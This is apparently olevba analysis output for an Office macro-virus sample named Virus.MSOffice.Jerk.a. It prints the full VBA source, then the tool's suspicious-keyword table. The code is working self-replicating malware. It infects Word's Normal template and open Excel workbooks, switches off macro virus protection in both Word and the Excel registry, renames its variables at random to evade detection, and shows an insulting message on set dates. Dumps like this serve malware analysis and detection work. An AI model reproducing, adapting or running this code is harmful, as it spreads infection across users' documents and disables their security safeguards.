olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.a-7f8d8cc8d51a5f7ac0312f2d86cd06e09d985c74
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.a-7f8d8cc8d51a5f7ac0312f2d86cd06e09d985c74 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Workbook_Deactivate()

On Error Resume Next

Const KPMNTUJWYUDKA = 1, QPKKVEJPDTKKD = True, XPYPVWCLPZWYQI = False, GQQTZVEDJNTU = 0

Dim EDXPRLWFQGMN, YOSBBLUDCNB As String
Dim XHUHX, JDSAS As Integer
Dim AIVORUIOJPKF As Boolean

YOSBBLUDCNB = "ThisWorkbook"

EDXPRLWFQGMN = Application.ThisWorkbook.VBProject.VBComponents.Item(KPMNTUJWYUDKA).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(KPMNTUJWYUDKA).CodeModule.CountOfLines)

Call HZSFUHVBWGNLRH(EDXPRLWFQGMN)

For XHUHX = KPMNTUJWYUDKA To Application.Workbooks.Count
  
  AIVORUIOJPKF = XPYPVWCLPZWYQI
  
  For JDSAS = KPMNTUJWYUDKA To Application.Workbooks.Item(XHUHX).VBProject.VBComponents.Count
  
    If Application.Workbooks.Item(XHUHX).VBProject.VBComponents.Item(JDSAS).CodeModule.CountOfLines = GQQTZVEDJNTU Then
   
      If Application.Workbooks.Item(XHUHX).Path <> "" And Application.Workbooks.Item(XHUHX).Saved = QPKKVEJPDTKKD And AIVORUIOJPKF = XPYPVWCLPZWYQI Then AIVORUIOJPKF = QPKKVEJPDTKKD
   
      Application.Workbooks.Item(XHUHX).VBProject.VBComponents.Item(JDSAS).CodeModule.InsertLines KPMNTUJWYUDKA, EDXPRLWFQGMN
      
      If Application.Workbooks.Item(XHUHX).VBProject.VBComponents.Item(JDSAS).Name = YOSBBLUDCNB Then
        Application.Workbooks.Item(XHUHX).VBProject.VBComponents.Item(JDSAS).CodeModule.ReplaceLine KPMNTUJWYUDKA * 33, "Private Sub Workbook_Deactivate()"
      Else
        Application.Workbooks.Item(XHUHX).VBProject.VBComponents.Item(JDSAS).CodeModule.ReplaceLine KPMNTUJWYUDKA * 33, "Private Sub Worksheet_Deactivate()"
      End If

    End If
    
  Next JDSAS
  
  If AIVORUIOJPKF = QPKKVEJPDTKKD Then Application.Workbooks.Item(XHUHX).Save

Next XHUHX

End Sub

Private Sub Document_Close()

On Error Resume Next

Const QPKKVEJPDTKKD = True, XPYPVWCLPZWYQI = False, GQQTZVEDJNTU = 0, KPMNTUJWYUDKA = 1, ZJEWMAYKQSVL = wdFormatDocument, OUFVNPUHBORRCHG = wdFormatTemplate, ECTEIM = ":"

Dim AIVORUIOJPKF, AXQNT, JKXFKGWAEYBUD, WANIFYDLY As Boolean
Dim UXQNLXXEFNNIE, AAMRQPBPFBCJTN As Object
Dim TLJEXDHVUYO, EDXPRLWFQGMN As String

If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"

Set UXQNLXXEFNNIE = ActiveDocument.VBProject.VBComponents.Item(KPMNTUJWYUDKA)
Set AAMRQPBPFBCJTN = NormalTemplate.VBProject.VBComponents.Item(KPMNTUJWYUDKA)

Randomize

JKXFKGWAEYBUD = XPYPVWCLPZWYQI
WANIFYDLY = XPYPVWCLPZWYQI

If UXQNLXXEFNNIE.CodeModule.CountOfLines <> GQQTZVEDJNTU Then JKXFKGWAEYBUD = QPKKVEJPDTKKD
If AAMRQPBPFBCJTN.CodeModule.CountOfLines <> GQQTZVEDJNTU Then WANIFYDLY = QPKKVEJPDTKKD

Options.VirusProtection = XPYPVWCLPZWYQI

If (JKXFKGWAEYBUD = QPKKVEJPDTKKD Xor WANIFYDLY = QPKKVEJPDTKKD) And (ActiveDocument.SaveFormat = ZJEWMAYKQSVL Or ActiveDocument.SaveFormat = OUFVNPUHBORRCHG) Then
   
  If JKXFKGWAEYBUD = QPKKVEJPDTKKD Then
  
    AXQNT = NormalTemplate.Saved
  
    EDXPRLWFQGMN = UXQNLXXEFNNIE.CodeModule.Lines(KPMNTUJWYUDKA, UXQNLXXEFNNIE.CodeModule.CountOfLines)
    
    Call USCYG(EDXPRLWFQGMN)
    If Int(Rnd * 10 * KPMNTUJWYUDKA) = KPMNTUJWYUDKA * 7 Then Call ECYWGIFNBSYT(EDXPRLWFQGMN)
    Call TZZLN(EDXPRLWFQGMN)

    AAMRQPBPFBCJTN.CodeModule.InsertLines KPMNTUJWYUDKA, EDXPRLWFQGMN
    
    If AXQNT = QPKKVEJPDTKKD Then NormalTemplate.Save
    
  End If


  TLJEXDHVUYO = Mid(ActiveDocument.FullName, 2, KPMNTUJWYUDKA)
  If WANIFYDLY = QPKKVEJPDTKKD And (TLJEXDHVUYO = ECTEIM Or ActiveDocument.Saved = XPYPVWCLPZWYQI) Then
  
    AIVORUIOJPKF = ActiveDocument.Saved
    
    EDXPRLWFQGMN = AAMRQPBPFBCJTN.CodeModule.Lines(KPMNTUJWYUDKA, AAMRQPBPFBCJTN.CodeModule.CountOfLines)
    
    Call TZZLN(EDXPRLWFQGMN)
    
    UXQNLXXEFNNIE.CodeModule.InsertLines KPMNTUJWYUDKA, EDXPRLWFQGMN
    
    If AIVORUIOJPKF = QPKKVEJPDTKKD Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub


Private Sub ECYWGIFNBSYT(ByRef EDXPRLWFQGMN As String)

On Error Resume Next

Const STAEHVNY = 48, ZKYIQHV = 15, SWYPT = 5, AMXZZUOOZZWKPX = 65, XRDFOWIQMWFNJ = 90, KPMNTUJWYUDKA = 1, QPKKVEJPDTKKD = True, XPYPVWCLPZWYQI = False

Dim PVRKHOJVWRVHV, VVCVVEHBBGTmp, BPQPZVCHAM, VVCVVEHBBG(KPMNTUJWYUDKA To STAEHVNY), VVCVVEHBBG2(KPMNTUJWYUDKA To STAEHVNY) As String
Dim XHUHX, JDSAS, IVLYPWCBKE As Integer
Dim AKTSV As Boolean

PVRKHOJVWRVHV = "EDXPRLWFQGMN STAEHVNY VVCVVEHBBG VVCVVEHBBG2 BPQPZVCHAM XHUHX JDSAS IVLYPWCBKE AKTSV ECYWGIFNBSYT ZKYIQHV SWYPT AMXZZUOOZZWKPX XRDFOWIQMWFNJ KPMNTUJWYUDKA PVRKHOJVWRVHV VVCVVEHBBGTmp AIVORUIOJPKF AXQNT JKXFKGWAEYBUD WANIFYDLY UXQNLXXEFNNIE AAMRQPBPFBCJTN USCYG TSGMTX CXSMSSDUL JXNNS ACFQCVDUDPI TSGMTXTmp PXXTSRSMJHMTJJD YHKIRP TLJEXDHVUYO QPKKVEJPDTKKD XPYPVWCLPZWYQI GQQTZVEDJNTU ZJEWMAYKQSVL OUFVNPUHBORRCHG KAASCEGFHWXQFWT MZUNNLVRNKLN ECTEIM QBGHVZWM DRWFZJIJB YOSBBLUDCNB HZSFUHVBWGNLRH TZZLN TWHXYYS ARYLEA XCSHKWYJ"

Randomize

JDSAS = KPMNTUJWYUDKA
For XHUHX = KPMNTUJWYUDKA To Len(PVRKHOJVWRVHV)
  If Mid(PVRKHOJVWRVHV, XHUHX, KPMNTUJWYUDKA) = " " Or XHUHX = Len(PVRKHOJVWRVHV) Then
    
    If XHUHX = Len(PVRKHOJVWRVHV) Then VVCVVEHBBGTmp = VVCVVEHBBGTmp & Mid(PVRKHOJVWRVHV, XHUHX, KPMNTUJWYUDKA)
    
    For IVLYPWCBKE = KPMNTUJWYUDKA To Int((ZKYIQHV - SWYPT + KPMNTUJWYUDKA) * Rnd + SWYPT)
      VVCVVEHBBG2(JDSAS) = VVCVVEHBBG2(JDSAS) & Chr(Int((XRDFOWIQMWFNJ - AMXZZUOOZZWKPX + KPMNTUJWYUDKA) * Rnd + AMXZZUOOZZWKPX))
    Next IVLYPWCBKE
    
    VVCVVEHBBG(JDSAS) = VVCVVEHBBGTmp
    VVCVVEHBBGTmp = ""
    JDSAS = JDSAS + KPMNTUJWYUDKA
  Else
    VVCVVEHBBGTmp = VVCVVEHBBGTmp & Mid(PVRKHOJVWRVHV, XHUHX, KPMNTUJWYUDKA)
  End If
Next XHUHX

AKTSV = XPYPVWCLPZWYQI
For XHUHX = KPMNTUJWYUDKA To Len(EDXPRLWFQGMN)

  For JDSAS = KPMNTUJWYUDKA To STAEHVNY
  
    If Mid(EDXPRLWFQGMN, XHUHX, Len(VVCVVEHBBG(JDSAS))) = VVCVVEHBBG(JDSAS) Then
      BPQPZVCHAM = BPQPZVCHAM & VVCVVEHBBG2(JDSAS)
      XHUHX = XHUHX + Len(VVCVVEHBBG(JDSAS)) - KPMNTUJWYUDKA
      AKTSV = QPKKVEJPDTKKD
      Exit For
    End If
    
  Next JDSAS
  
  If AKTSV = XPYPVWCLPZWYQI Then
    BPQPZVCHAM = BPQPZVCHAM & Mid(EDXPRLWFQGMN, XHUHX, KPMNTUJWYUDKA)
  Else
    AKTSV = XPYPVWCLPZWYQI
  End If
  
Next XHUHX

EDXPRLWFQGMN = BPQPZVCHAM

End Sub


Private Sub USCYG(ByRef EDXPRLWFQGMN As String)

On Error Resume Next

Const ACFQCVDUDPI = "' ", KPMNTUJWYUDKA = 1
Const KAASCEGFHWXQFWT = "hh:mm:ss: AMPM - ", MZUNNLVRNKLN = "dddd, d mmm yyyy"

Dim TSGMTXTmp, TSGMTX, PXXTSRSMJHMTJJD, YHKIRP, CXSMSSDUL, JXNNS As String
Dim XHUHX As Integer

    CXSMSSDUL = Chr(10 * KPMNTUJWYUDKA + 3)
    TSGMTX = Application.UserAddress
    YHKIRP = Format(Time, KAASCEGFHWXQFWT) & Format(Date, MZUNNLVRNKLN)
    JXNNS = Chr(KPMNTUJWYUDKA * 10)
    PXXTSRSMJHMTJJD = Application.UserName
    
    For XHUHX = KPMNTUJWYUDKA To Len(TSGMTX)
      If Mid(TSGMTX, XHUHX, KPMNTUJWYUDKA) <> CXSMSSDUL Then
        If Mid(TSGMTX, XHUHX, KPMNTUJWYUDKA) <> JXNNS Then
          TSGMTXTmp = TSGMTXTmp & Mid(TSGMTX, XHUHX, KPMNTUJWYUDKA)
        End If
      Else
        TSGMTXTmp = TSGMTXTmp & CXSMSSDUL & ACFQCVDUDPI
      End If
    Next XHUHX

    EDXPRLWFQGMN = EDXPRLWFQGMN & CXSMSSDUL & ACFQCVDUDPI & YHKIRP & CXSMSSDUL & ACFQCVDUDPI & PXXTSRSMJHMTJJD & CXSMSSDUL & ACFQCVDUDPI & TSGMTX & CXSMSSDUL
End Sub

Private Sub TZZLN(ByVal EDXPRLWFQGMN As String)

On Error Resume Next

Dim XCSHKWYJ As Long
Dim QBGHVZWM As Object
Dim TWHXYYS, ARYLEA As String

TWHXYYS = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
XCSHKWYJ = &H0
ARYLEA = "Options6"

System.PrivateProfileString("", TWHXYYS, ARYLEA) = XCSHKWYJ

Set QBGHVZWM = GetObject(, "Excel.Application")

Const KPMNTUJWYUDKA = 1, GQQTZVEDJNTU = 0

Dim YOSBBLUDCNB As String
Dim XHUHX, JDSAS As Integer

YOSBBLUDCNB = "ThisWorkbook"

For XHUHX = KPMNTUJWYUDKA To QBGHVZWM.Application.Workbooks.Count
  
  For JDSAS = KPMNTUJWYUDKA To QBGHVZWM.Application.Workbooks.Item(XHUHX).VBProject.VBComponents.Count
  
    If QBGHVZWM.Application.Workbooks.Item(XHUHX).VBProject.VBComponents.Item(JDSAS).CodeModule.CountOfLines = GQQTZVEDJNTU Then
    
      QBGHVZWM.Application.Workbooks.Item(XHUHX).VBProject.VBComponents.Item(JDSAS).CodeModule.InsertLines KPMNTUJWYUDKA, EDXPRLWFQGMN
      
      If QBGHVZWM.Application.Workbooks.Item(XHUHX).VBProject.VBComponents.Item(JDSAS).Name = YOSBBLUDCNB Then
        QBGHVZWM.Application.Workbooks.Item(XHUHX).VBProject.VBComponents.Item(JDSAS).CodeModule.ReplaceLine 33 * KPMNTUJWYUDKA, "Private Sub Workbook_Deactivate()"
      Else
        QBGHVZWM.Application.Workbooks.Item(XHUHX).VBProject.VBComponents.Item(JDSAS).CodeModule.ReplaceLine KPMNTUJWYUDKA * 33, "Private Sub Worksheet_Deactivate()"
      End If

    End If
    
  Next JDSAS
  
Next XHUHX


Set QBGHVZWM = Nothing

End Sub


Private Sub HZSFUHVBWGNLRH(ByVal EDXPRLWFQGMN As String)

On Error Resume Next

Const QPKKVEJPDTKKD = True, XPYPVWCLPZWYQI = False, KPMNTUJWYUDKA = 1, GQQTZVEDJNTU = 0
Dim DRWFZJIJB As Object
Dim AXQNT As Boolean

Set DRWFZJIJB = GetObject(, "Word.Application")

If DRWFZJIJB.NormalTemplate.VBProject.VBComponents.Item(KPMNTUJWYUDKA).CodeModule.CountOfLines = GQQTZVEDJNTU Then
  AXQNT = DRWFZJIJB.NormalTemplate.Saved
  DRWFZJIJB.Options.VirusProtection = XPYPVWCLPZWYQI
  DRWFZJIJB.NormalTemplate.VBProject.VBComponents.Item(KPMNTUJWYUDKA).CodeModule.InsertLines KPMNTUJWYUDKA, EDXPRLWFQGMN
  If AXQNT = QPKKVEJPDTKKD Then DRWFZJIJB.NormalTemplate.Save
End If

Set DRWFZJIJB = Nothing

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

